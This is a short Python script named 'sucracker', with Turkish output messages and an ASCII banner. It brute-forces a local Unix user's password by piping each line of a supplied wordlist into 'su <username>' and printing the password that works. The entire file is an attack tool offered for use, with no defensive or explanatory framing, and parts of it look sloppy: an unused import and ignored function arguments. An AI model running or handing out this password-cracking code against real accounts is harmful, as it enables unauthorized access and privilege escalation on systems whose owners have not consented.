import sys
import os
import subprocess
import progress

try:
	k_adi = sys.argv[1]
	wordlist = sys.argv[2]


	banner = """ 
 ____  _   _     ____ ____     _    ____ _  _______ ____  
/ ___|| | | |   / ___|  _ \   / \  / ___| |/ | ____|  _ \ 
\___ \| | | |  | |   | |_) | / _ \| |   | ' /|  _| | |_) |
 ___) | |_| |  | |___|  _ < / ___ | |___| . \| |___|  _ < 
|____/ \___/    \____|_| \_/_/   \_\____|_|\_|_____|_| \_\
                                                                                                   
"""


	def wdcheck():
		if os.path.isfile(wordlist):
			return True
		else:
			return False
        
	def crack(nn,passwd):
		with open(wordlist, "r", encoding="utf-8") as wd:
			for password in wd.readlines():
				proc = subprocess.Popen(['su',k_adi], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				proc.stdin.write(password.encode("UTF-8"))
				error = proc.communicate()
				rcode = proc.returncode
				if rcode == "0" or rcode == 0:
					print("{} Kullanıcısının Şifresi = {}".format(k_adi,password))
					break
	if wdcheck() == True:
		print("*" * 50)
		print(banner)
		print("*" * 50)
		print("Şifre Kırılıyor...")
		print("*" * 50)
		print("\n")
		crack(k_adi,wordlist)
		print("*" * 50)
	else:
		print("Wordlist bulunamadı lütfen tekrar deneyin...")

except IndexError:
	print("*" * 50)
	print(banner)
	print("*" * 50)
	print("İstenen Parametreleri Girmediniz.")
	print("*" * 50)
	print("Kullanım Şekli:\n\npython3 sucracker.py username wordlist.txt")
	print("*" * 50)
